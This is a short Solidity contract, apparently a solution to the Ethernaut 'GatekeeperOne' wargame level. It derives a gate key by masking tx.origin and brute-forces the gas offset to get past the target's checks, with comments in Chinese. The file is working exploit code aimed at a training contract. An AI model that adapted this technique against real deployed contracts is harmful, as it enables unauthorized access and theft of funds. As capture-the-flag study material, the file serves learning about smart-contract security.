// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public target;
    
    constructor(address _target) {
        target = GatekeeperOne(_target);
    }
    
    function attack() public {
        // 构造 gateKey
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        
        // 暴力破解 gas
        for (uint256 i = 0; i < 300; i++) {
            (bool success,) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}